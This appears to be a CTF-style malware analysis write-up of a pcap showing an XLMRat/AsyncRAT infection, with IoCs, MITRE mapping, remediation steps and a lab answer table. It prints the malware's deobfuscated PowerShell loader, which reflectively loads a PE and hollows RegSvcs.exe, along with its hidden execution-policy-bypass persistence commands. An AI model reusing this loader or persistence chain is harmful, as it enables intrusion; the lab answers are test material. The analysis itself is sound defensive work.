# Incident Report: XLMRat – XLMMacroDeobfuscator Analysis, Reflective .NET Loading & AsyncRAT Process Hollowing via RegSvcs.exe

| Metadata | Details | 
| ----- | ----- | 
| **Date** | November 2026 | 
| **Analyst** | Piotr Asyngier | 
| **Tools Used** | Wireshark (`236-XLMRat.pcap`), CyberChef / CLI (`sha256sum`), VirusTotal | 
| **Category** | Network Forensics, Malware Analysis, LOLBin Process Hollowing & Persistence | 
| **Affected Environment** | Victim Host: `10.1.9.101` | 

## 1. Executive Summary

Network intrusion detection alerted on suspicious outbound HTTP requests over a non-standard port (`TCP/222`) originating from workstation **`10.1.9.101`**. A packet-level forensic analysis of the network capture (`236-XLMRat.pcap`, comprising `1,520` packets) was conducted in **Wireshark**, combined with payload deobfuscation and **VirusTotal** threat intelligence enrichment, to reconstruct the **XLMRat / AsyncRAT** infection chain.

The investigation revealed a multi-stage fileless and disk-persisted attack:

1. **Initial Stage Delivery (`/xlm.txt` -> `/mdm.jpg`):** Host `10.1.9.101` fetched an obfuscated Excel 4.0 (XLM) macro/script (`GET /xlm.txt`) from **`45.126.209.4:222`** (hosted on **`ReliableSite.Net`**), which assembled a command to download the first-stage PowerShell loader masquerading as an image: **`hxxp://45.126.209.4:222/mdm.jpg`**.

2. **In-Memory Reflective Loading & Process Hollowing (`RegSvcs.exe`):** The script inside `mdm.jpg` decoded two hex-encoded Portable Executable (PE) byte arrays (`$hexString_pe` and `$hexString_bbb`), reflectively loaded the `.NET` injector via `[Reflection.Assembly]::Load($pe)`, and injected the **AsyncRAT** payload (`SHA-256: 1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798`) into the legitimate .NET utility **`C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe`**.

3. **Multi-File Persistence (`C:\Users\Public\`):** To maintain access across reboots, the script dropped three staging files—**`Conted.ps1`**, **`Conted.bat`**, and **`Conted.vbs`**—into `C:\Users\Public\` and registered a Scheduled Task via the `Schedule.Service` COM object.

## 2. Network Traffic Investigation & Technical Analysis

### 2.1. First-Stage Malware URL Identification (`hxxp://45.126.209.4:222/mdm.jpg`)

To identify the initial HTTP communications between the victim (`10.1.9.101`) and the external command-and-control (C2) server, packet capture traffic was filtered for HTTP streams.

* **Wireshark Display Filter:**

  ```
  http
  ```

* **Findings:**

  * In Frame `4` (`2024-01-09 18:27:27.971216 UTC`), the victim (`10.1.9.101`) requested `GET /xlm.txt HTTP/1.1` from `45.126.209.4` over TCP port `222`.

  * Following `tcp.stream eq 0` revealed a character-by-character array assignment (`LZeWX(0)="R"`, `LZeWX(1)="E"`, ... `LZeWX(18)="h"`, `LZeWX(19)="t"`, `LZeWX(20)="t"`, `LZeWX(21)="p"`, etc.) constructing a download cradle pointing to `/mdm.jpg`.

  * Immediately afterward, in Frame `12` (`2024-01-09 18:27:29.161040 UTC`, `tcp.stream eq 1`), the victim issued `GET /mdm.jpg HTTP/1.1` to `Host: 45.126.209.4:222`.

  * **First-Stage Malware URL (Defanged):** **`hxxp://45.126.209.4:222/mdm.jpg`**

<img width="1852" height="1048" alt="obraz" src="https://github.com/user-attachments/assets/0aa8ea36-c736-4d12-81ef-077925c771d4" />

<img width="1852" height="1048" alt="obraz" src="https://github.com/user-attachments/assets/ff3bd048-2549-4005-ab33-54e9248fdafc" />


### 2.2. Threat Intelligence – Hosting Provider Identification (`ReliableSite.Net`)

To attribute the infrastructure hosting the staging server (`45.126.209.4`), the IP address was queried in **VirusTotal**.

* **Threat Intelligence Lookup:** `45.126.209.4`

* **Findings:**

  * VirusTotal flagged the IP address with **14/90** malicious detections.

  * **Autonomous System (ASN):** `AS23470` (**`ReliableSite.Net`** / *ReliableSite.Net LLC*, United States).

<img width="1852" height="966" alt="obraz" src="https://github.com/user-attachments/assets/20a6d9c4-a1ac-4f2e-9ffa-614302d3c73e" />


### 2.3. Extraction & SHA-256 Hashing of the Malware Executable

Inspecting the HTTP response for `GET /mdm.jpg` (Frame `344`, `tcp.stream eq 1`, `431,290 bytes`) revealed that despite the `Content-Type: image/jpeg` header, the body was a plain-text PowerShell script containing two large underscore-separated hexadecimal strings:

1. **`$hexString_bbb`:** The primary malware executable payload (`4D_5A_90_00...`).
2. **`$hexString_pe`:** A secondary `.NET` loader/injector DLL (`4D_5A_90_00...`).

* **Extraction & Hashing Methodology:**

  * Extracted the hex string assigned to `$hexString_bbb` from `tcp.stream eq 1`.

  * Removed all underscore (`_`) delimiters (`replace "_" with ""`) and converted the hex dump back into a raw binary executable (`Stub.exe` / `download.exe`, `66,560 bytes`).

  * Calculated the SHA-256 hash using `sha256sum`:

    * **SHA-256:** **`1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798`**

<img width="1852" height="1049" alt="obraz" src="https://github.com/user-attachments/assets/03d8a66c-f25a-438b-b22a-b28ba422b3d8" />


### 2.4. Malware Family Attribution via VirusTotal (`asyncrat`)

Searching the calculated SHA-256 hash (`1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798`) on **VirusTotal** confirmed that the payload is a known Remote Access Trojan.

* **Findings:**

  * The binary (`Stub.exe` / `download.exe`) was flagged by **61/72** security vendors.

  * **Alibaba Detection / Family Label:** `Trojan:Win32/AsyncRat.a91b370b` (Family label: **`asyncrat`**).

<img width="1852" height="966" alt="obraz" src="https://github.com/user-attachments/assets/502024d2-9896-48ac-bc9e-5d82caa94aae" />


### 2.5. PE Header Compilation Timestamp Analysis (`2023-10-30 15:08`)

Pivoting to the **Details** tab in VirusTotal for `1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798` exposed the Portable Executable (PE32 `.NET` assembly) metadata and history timestamps.

* **Findings:**

  * **File Size:** `65.00 KB (66,560 bytes)`

  * **PE Header Creation Time (Compile Timestamp):** **`2023-10-30 15:08:54 UTC`** (**`2023-10-30 15:08`**).

<img width="1852" height="966" alt="obraz" src="https://github.com/user-attachments/assets/48bcc9dc-5cec-4a8a-9de9-385e00e77e91" />


### 2.6. Abused .NET LOLBin Identification (`RegSvcs.exe`)

Scrolling down to the execution logic at the bottom of the PowerShell script inside `mdm.jpg` (`tcp.stream eq 1`) revealed how the loader (`$pe`) injects and executes the AsyncRAT binary (`$NKbb`) in memory.

* **Deobfuscated PowerShell Execution Snippet (`tcp.stream eq 1`):**

  ```powershell
  [byte[]] $NKbb = $hexString_bbb -split '_' | ForEach-Object { [byte]([convert]::ToInt32($_, 16)) }
  [byte[]] $pe   = $hexString_pe  -split '_' | ForEach-Object { [byte]([convert]::ToInt32($_, 16)) }

  $HM = 'L######################oad' -replace '#', ''
  $fu = [Reflection.Assembly]::$HM($pe)

  $NK = $fu.GetType('N#######Z.P#E' -replace '#', '')
  $MZ = $NK.GetMethod('Execute')
  $NA = 'C:\W#########indows\Micr##########osoft.NET\Fra###########mework\v4.0.30319\RegSvcs.exe' -replace '#', ''
  $AC = $NA
  $VA = @($AC, $NKbb)

  $CM = 'I#######################nv###################oke' -replace '#', ''
  $EY = $MZ.$CM($null, [object[]] $VA)
  ```

* **Findings:**

  * After stripping the `#` obfuscation characters (`-replace '#', ''`), the target binary passed to the `NZ.PE::Execute` process hollowing method (`$NA`) is:

    * **`C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe`**

<img width="1852" height="1049" alt="obraz" src="https://github.com/user-attachments/assets/bdeb28fb-0d8b-49c0-b3f9-d7737eac342f" />


### 2.7. Dropped Persistence Artifacts Identification (`conted.ps1, conted.bat, conted.vbs`)

Further inspection of `tcp.stream eq 1` (Frame `344`) showed that the PowerShell script writes three distinct files to `C:\Users\Public\` using `[IO.File]::WriteAllText(...)` and schedules their execution via a Windows Scheduled Task (`New-Object -ComObject Schedule.Service`).

* **Dropped File Operations Identified in `tcp.stream eq 1`:**

  1. **`[IO.File]::WriteAllText("C:\Users\Public\Conted.ps1", $Content)`:** Writes the main PowerShell loader script to disk.

  2. **`[IO.File]::WriteAllText("C:\Users\Public\Conted.bat", $Content)`:** Writes a batch wrapper executing `powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& 'C:\Users\Public\Conted.ps1'"`.

  3. **`[IO.File]::WriteAllText("C:\Users\Public\Conted.vbs", $Content)`:** Writes a VBScript wrapper (`WScript.Shell.Run "C:\Users\Public\Conted.bat", 0`) to launch the batch script with a hidden window (`visibility = 0`), triggered every few minutes via the registered Scheduled Task.

* **Dropped Files List:** **`conted.ps1, conted.bat, conted.vbs`**

<img width="1852" height="1049" alt="obraz" src="https://github.com/user-attachments/assets/2a255d94-7909-4055-bfcc-045a965b9085" />

<img width="1852" height="1049" alt="obraz" src="https://github.com/user-attachments/assets/4e64fe8f-6a86-4cef-886f-7472c050d637" />


## 3. Attack Timeline (January 9, 2024)

| Timestamp (UTC) | Source IP | Destination IP | Protocol / Frame | Activity Description | 
| ----- | ----- | ----- | ----- | ----- | 
| `2024-01-09 18:27:27.97` | `10.1.9.101` | `45.126.209.4:222` | `HTTP` (`#4-7`) | Victim requests `GET /xlm.txt`, receiving obfuscated XLM macro downloader. | 
| `2024-01-09 18:27:29.16` | `10.1.9.101` | `45.126.209.4:222` | `HTTP` (`#12`) | Victim executes first-stage request `GET /mdm.jpg HTTP/1.1`. | 
| `2024-01-09 18:27:31.25` | `45.126.209.4:222` | `10.1.9.101` | `HTTP` (`#344`) | Server delivers `431 KB` PowerShell script (`mdm.jpg`) containing hex-encoded AsyncRAT (`$hexString_bbb`), reflective loader (`$hexString_pe`), and persistence droppers (`Conted.ps1`, `Conted.bat`, `Conted.vbs`). | 

## 4. Consolidated Indicators of Compromise (IoCs)

| Indicator Type | Value (Defanged) | Context | 
| ----- | ----- | ----- | 
| **C2 / Staging IPv4** | `45.126.209[.]4` (`Port 222`) | External staging server (`AS23470`, `ReliableSite.Net`) | 
| **Initial Stage URL** | `hxxp://45.126.209[.]4:222/xlm.txt` | Obfuscated XLM macro script | 
| **First-Stage Payload URL** | `hxxp://45.126.209[.]4:222/mdm.jpg` | PowerShell loader & hex-encoded PE staging script | 
| **Malware SHA-256** | `1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798` | Decoded AsyncRAT executable (`$hexString_bbb`, `66,560 B`) | 
| **Abused LOLBin Path** | `C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe` | Legitimate .NET binary hollowed via `NZ.PE::Execute` | 
| **Dropped Persistence Files** | `C:\Users\Public\Conted.ps1`, `C:\Users\Public\Conted.bat`, `C:\Users\Public\Conted.vbs` | Multi-stage persistence chain executed via Scheduled Task | 

## 5. Summary of Lab Questions & Answers

| Question | Answer | 
| ----- | ----- | 
| **Q1:** What is the URL from which the first malware stage was installed? | `hxxp://45.126.209.4:222/mdm.jpg` | 
| **Q2:** Which hosting provider owns the associated IP address? | `ReliableSite.Net` | 
| **Q3:** What is the SHA256 of the malware executable? | `1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798` | 
| **Q4:** What is the malware family label based on Alibaba? | `asyncrat` | 
| **Q5:** What is the PE header compile (Creation Time) timestamp of the malware? | `2023-10-30 15:08` | 
| **Q6:** Which LOLBin is leveraged for stealthy process execution in this script? | `C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe` | 
| **Q7:** List the names of the files dropped by the script. | `conted.ps1, conted.bat, conted.vbs` | 

## 6. MITRE ATT&CK Mapping & Remediation

### MITRE ATT&CK Techniques

* **`T1059.001` – Command and Scripting Interpreter: PowerShell:** Using PowerShell to decode hex arrays, reflectively load `[Reflection.Assembly]::Load($pe)`, and write persistence scripts.

* **`T1620` – Reflective Code Loading:** Loading the `.NET` injector (`NZ.PE`) directly into memory from a byte array (`$pe`) without touching disk.

* **`T1055.012` – Process Injection: Process Hollowing:** Injecting the AsyncRAT payload (`$NKbb`) into a suspended instance of `C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe`.

* **`T1218.009` – System Binary Proxy Execution: Regsvcs/Regasm:** Abusing the signed Microsoft .NET `RegSvcs.exe` binary to blend in with legitimate system activity.

* **`T1053.005` – Scheduled Task/Job: Scheduled Task:** Registering a recurring task via the `Schedule.Service` COM object to execute `C:\Users\Public\Conted.vbs` -> `Conted.bat` -> `Conted.ps1`.

### Recommended Remediation Actions

1. **Endpoint Isolation & Eradication:** Immediately isolate `10.1.9.101`, terminate any running instances of `RegSvcs.exe`, `wscript.exe`, and `powershell.exe`, delete the malicious Scheduled Task, and remove `C:\Users\Public\Conted.ps1`, `Conted.bat`, and `Conted.vbs`.

2. **PowerShell & AMSI Monitoring:** Enable PowerShell **Script Block Logging (`Event ID 4104`)** and **Module Logging (`Event ID 4103`)** to capture deobfuscated `[Reflection.Assembly]::Load()` calls in SIEM telemetry.

3. **LOLBin & Network Controls:** Block outbound traffic to `45.126.209.4` (especially on non-standard port `222`) at the perimeter firewall, and create EDR behavioral detections for `RegSvcs.exe` spawning without command-line arguments or initiating external network connections.
